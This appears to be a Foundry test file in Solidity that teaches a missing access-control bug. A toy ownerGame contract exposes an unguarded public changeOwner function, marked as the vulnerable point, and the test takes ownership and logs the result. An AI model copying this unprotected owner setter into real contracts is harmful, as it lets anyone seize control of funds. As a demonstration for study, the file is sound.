// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
        ownerGame ownerGameContract;

function testVisibility() public {
 
    ownerGameContract = new ownerGame();
    console.log("Before exploiting, owner of ownerGame:",ownerGameContract.owner());
    ownerGameContract.changeOwner(msg.sender);
    console.log("After exploiting, owner of ownerGame:",ownerGameContract.owner());
    console.log("Exploit completed");

    }
  receive() payable external{}
}
contract ownerGame{
    address public owner;
 
    constructor() {
        owner = msg.sender;
    }
 
    function changeOwner(address _new) public {      //vulnerable point
        owner = _new;
    }
}
